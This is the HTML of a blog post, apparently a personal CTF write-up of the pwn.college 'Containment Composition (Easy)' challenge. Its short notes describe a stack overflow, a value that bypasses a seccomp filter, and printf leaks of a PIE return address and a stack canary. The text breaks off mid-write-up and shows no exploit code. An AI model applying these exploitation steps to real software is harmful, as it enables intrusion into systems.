@@ -1,0 +1,1247 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Welcome to backProgram ExploitationChallengesContainment Composition (Easy)  No win function   stack overflow??? maybe orw   a seccomp filter！   wc   If rbp-0x28 is 0x725271a4bd26531a   The seccomp wi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college-pro sec-_Program Explotation">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro%20sec-_Program%20Explotation/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="Welcome to backProgram ExploitationChallengesContainment Composition (Easy)  No win function   stack overflow??? maybe orw   a seccomp filter！   wc   If rbp-0x28 is 0x725271a4bd26531a   The seccomp wi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772618490906-4e31c3a4-f1ec-4ba1-b0e2-f28d27c9cd8f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772618557020-11cf6ef5-c45b-4485-943f-7e8963ab5c75.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772618679050-03cdeaf4-0a80-41b9-8c17-f01b680604d3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772619577043-14f52c3d-a823-4280-8203-62fc29854e85.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772626325992-c70deda2-50ff-4173-a78b-4aa35514454c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772626419365-852882ea-b619-4388-9278-43c7ac8d46c0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772627360353-af3ed5e6-c36c-4fb3-9ba6-ee592980b77c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772627990269-408a9996-5c79-4431-b459-2521e063c5f2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772628075853-416a53de-aa15-4bfc-b612-64ca3adc2696.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772629385914-947aacfd-2aa3-4beb-9fd9-0dc749f5c62a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772629486172-28474ece-cd7d-435a-ae4c-65868ccb0463.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772629850222-30135704-f843-4e65-b075-83f2520fddb7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772715531039-11ddb6d8-9950-479a-a582-9b3f2d756ccd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772716135084-73d644a4-e4e0-4dcf-b585-c6d4242a8e62.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772717221607-9d854921-1856-42f2-b8da-b4f8407a2964.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772717533772-f8273460-e5ff-4880-a877-cf37841196f0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772717731707-6d517e5d-bd39-490f-a832-5d453a887268.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772718067230-ae170ccc-88af-43ad-8516-4e398bb2d541.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772718688454-8e6d323d-3df5-47cd-81b8-b4aa19253da1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772718710503-35a3081c-8046-417d-8335-0997f85cf669.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772798163408-d13bee74-1fe7-4bdb-8ad5-5b6399d4dc78.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772799529338-fa4a204e-eea8-4b32-9fb5-c2b7065d759e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772799654446-312e0961-12e5-47ee-9acc-dcf5893b4529.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772800375174-57813b83-094b-4906-931b-f71c423e87ef.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772800896147-f2572c8b-a419-4de9-bed4-64fe361f9794.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772800956364-6e57db2a-0f23-4456-9008-d213581430b9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772800976347-61f69e1e-7fa8-492f-be23-289f727d3a13.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772802579393-68541c73-9317-40c6-a598-4a693f712788.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772802598212-e8707bf1-ba6c-4ca5-96cc-37e60fbf8bb1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772802939683-0daa6d5e-d6f8-4fba-ac1e-84979a336112.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772803014397-d7dd01f7-2272-4775-acac-a5bb706a6018.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772804194472-c10a8224-7d0e-40f0-89ef-0eea353f1290.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772878783536-554a9599-0a64-4117-8abe-6cf8a3742956.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772878964805-6f38df2d-c5d4-42b8-bccd-f4e348f7f133.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772879147210-b4730d86-0718-4220-947c-8c1aa4aa519e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772804744062-a929046f-6a34-4a25-ac3b-7cf810eacb35.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772804754541-86c9a910-5c8b-4e53-bff1-171b30a1e0ab.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772804776243-c61b31de-a6c7-41a8-bf4e-261aa129a5fc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772879855074-bad69766-0b37-4ca1-89a9-8af5d9ddfd58.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772879316006-581705fe-2127-44ac-ab9d-f2d9375b1e56.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772880509836-0505846a-3113-4e89-9545-9c1ccf9855d6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772881189986-a01c74a5-60e3-4a76-8716-b5072d897497.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772881231418-0a6a1856-62cc-44b2-af96-0f48dd433518.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772881342631-32e6ef4e-f7f5-4c95-98af-aa95f7b9c648.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772881672481-5aa69083-c14b-41a9-92f6-0743dd4d4781.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772882153418-c0ef962c-e1e7-465f-bf66-9b0f7be9a200.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772883278163-199389a1-21ae-42e9-bd7b-3f3963292a8e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772883312469-a44ddf2f-2e52-4b83-9570-3bed1c402919.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772883513129-d8d3ec87-b9bf-464a-b6c8-4fd423e7a400.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772883701969-5ea8b577-48e6-498c-bf23-e05f8364feef.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772884621938-72196adc-6251-4302-87e7-abb269a4ce00.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773203626081-f1fd4d81-0fc8-4b07-a1af-57012e7c5d59.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773207844412-68341c44-4e33-4275-8bc7-292827f66a83.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773230924564-ad71dfc0-421e-4be4-bea1-380d739e424f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773208960780-afa4ffe6-0e3a-436c-b9a1-081deb450ac1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773210747141-54429f98-9069-47ce-b1d8-7f98792b18cc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773211033219-1f549cd8-9e5f-475d-abd5-a3dbe1251446.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773211052060-f60d6a9a-bf43-43d2-b162-4cbee6aa9617.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773232017392-023d26fa-90bf-4043-bd6c-77ff443b0333.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773323272476-3d8d9f5c-1f52-41e2-87d9-152e42190da2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773326910378-a13c357d-4a7b-4bb1-b390-51cd952a8663.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773319659423-ef9c1f00-570d-4bc9-bf24-f2100990c7f0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773327896549-1b6754ca-a88f-4008-ae7d-dbf3343ea87d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773327954560-9194174b-3648-4803-933f-9182f2d721eb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773328299711-e23a129f-7038-45dd-896c-a2e088c495fc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773328463662-eaa7c021-2136-48b4-ae60-ea9141af0514.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773328671404-6cc4129e-0403-42e4-b42e-4cefd98f460a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773402582428-4bb9dbac-8ec2-433b-b96e-dbf6f54cfdc1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773402630710-65bc7c5b-f13d-4c38-a758-38b8705b44eb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773402803820-fd14ec15-7c9b-44b2-802d-723325cdebfe.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403031952-8aa11143-0340-4056-a6cc-3326bf0a0056.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403123426-ab0b0399-91cc-48f5-aa2b-58d86afc78b3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403158117-b557e7f3-ed10-4aeb-899f-75b4dd5bd752.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403395676-de67385c-14bd-438f-b6cc-d64080e98d86.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403583989-8f4ed84d-9329-4b86-8c0e-459cec9ffa1f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773403673527-b5f05ecc-ea47-405a-b74e-c9011e4ddc80.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773404619784-31717fc6-6a6d-4d4b-b259-5c70f3eaf9aa.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773404694988-bf779476-5eb3-4635-ad15-a47b1668b551.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773404766069-0e9bc74a-327a-4ab1-97f9-e0fd1cc49eef.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773404809013-6f26b057-7530-4963-98ce-23f0ef8c9700.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773405457332-4d785b02-b621-409a-8131-a15ec4ff700c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1773407003540-6523f8d1-e2b0-4782-900a-e72148fa387e.png">
+<meta property="article:published_time" content="2026-04-23T12:55:43.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:26:33.690Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Explotation/1772618490906-4e31c3a4-f1ec-4ba1-b0e2-f28d27c9cd8f.png">
+  
+  
+  
+  <title>pwn.college-pro sec-_Program Explotation - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college-pro sec-_Program Explotation"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 20:55" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 56 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college-pro sec-_Program Explotation</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Welcome-to-back"><a href="#Welcome-to-back" class="headerlink" title="Welcome to back"></a><em><font style="color:#81DFE4;">Welcome to back</font></em></h1><h3 id="Program-Exploitation"><a href="#Program-Exploitation" class="headerlink" title="Program Exploitation"></a><font style="color:#2F8EF4;background-color:#FFFFFF;">Program Exploitation</font></h3><h4 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Challenges</font></h4><h5 id="Containment-Composition-Easy"><a href="#Containment-Composition-Easy" class="headerlink" title="Containment Composition (Easy)"></a><font style="color:#2F8EF4;">Containment Composition (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772618490906-4e31c3a4-f1ec-4ba1-b0e2-f28d27c9cd8f.png" srcset="/img/loading.gif" lazyload></p>
+<p>No win function</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772618557020-11cf6ef5-c45b-4485-943f-7e8963ab5c75.png" srcset="/img/loading.gif" lazyload></p>
+<p>stack overflow???</p>
+<p>maybe orw</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772618679050-03cdeaf4-0a80-41b9-8c17-f01b680604d3.png" srcset="/img/loading.gif" lazyload></p>
+<p>a seccomp filter！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772619577043-14f52c3d-a823-4280-8203-62fc29854e85.png" srcset="/img/loading.gif" lazyload></p>
+<p>wc</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772626325992-c70deda2-50ff-4173-a78b-4aa35514454c.png" srcset="/img/loading.gif" lazyload></p>
+<p>If rbp-0x28 is 0x725271a4bd26531a</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772626419365-852882ea-b619-4388-9278-43c7ac8d46c0.png" srcset="/img/loading.gif" lazyload></p>
+<p>The seccomp will be avoided</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772627360353-af3ed5e6-c36c-4fb3-9ba6-ee592980b77c.png" srcset="/img/loading.gif" lazyload></p>
+<p>REPEAT !!!</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772627990269-408a9996-5c79-4431-b459-2521e063c5f2.png" srcset="/img/loading.gif" lazyload></p>
+<p>read to rbp-0x78, but what’s in rbp-0x78?</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772628075853-416a53de-aa15-4bfc-b612-64ca3adc2696.png" srcset="/img/loading.gif" lazyload></p>
+<p>Here is the addr of rbp-0x60</p>
+<p>so, buffer is at rbp-0x60</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772629385914-947aacfd-2aa3-4beb-9fd9-0dc749f5c62a.png" srcset="/img/loading.gif" lazyload></p>
+<p>We could utilize printf to leak data </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772629486172-28474ece-cd7d-435a-ae4c-65868ccb0463.png" srcset="/img/loading.gif" lazyload></p>
+<p>We find canary at rbp-0x18</p>
+<p>specially</p>
+<p>The challenge has PIE</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772629850222-30135704-f843-4e65-b075-83f2520fddb7.png" srcset="/img/loading.gif" lazyload></p>
+<p>Get libc</p>
+<p>At first we could utilize the printf to leak the address at challenge’s ret which pointer to main</p>
+ <!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772715531039-11ddb6d8-9950-479a-a582-9b3f2d756ccd.png" srcset="/img/loading.gif" lazyload></p>
+<p>The vaule - 0x22b6 &#x3D; main_base_addr</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772716135084-73d644a4-e4e0-4dcf-b585-c6d4242a8e62.png" srcset="/img/loading.gif" lazyload></p>
+<p>success</p>
+<p>Now, is time to leak canary</p>
+<p>The canary is at $rbp-0x18</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Explotation/1772717221607-9d854921-1856-42f2-b8da-b4f8407a2964.png" srcset="/img/loading.gif" lazyload></p>
+<p>????</p>
